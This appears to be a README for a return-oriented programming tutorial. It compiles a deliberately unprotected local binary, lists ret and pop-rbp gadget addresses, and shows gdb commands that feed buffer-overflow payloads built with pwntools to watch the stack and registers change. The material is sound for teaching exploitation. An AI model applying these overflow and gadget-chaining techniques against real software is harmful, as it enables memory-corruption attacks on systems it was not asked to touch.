# ROP Chains tutorial

Compile using

`gcc main.c -O0 -no-pie -fno-stack-protector -z execstack -o bin.out`

ret gadget @ 0x00401110

pop rbp gadget @ 0x0040110d

To see it in action,  inside `gdb bin.out`

`r < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'a'*40 + pwn.p64(0x00401110))")`

for the ret gadget. You will see rsp moving 0x8.

`r < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'a'*40 + pwn.p64(0x0040110d) + pwn.p64(0xdeadbeef))")`

for the pop gadget. You will see the value getting stored in rbp.
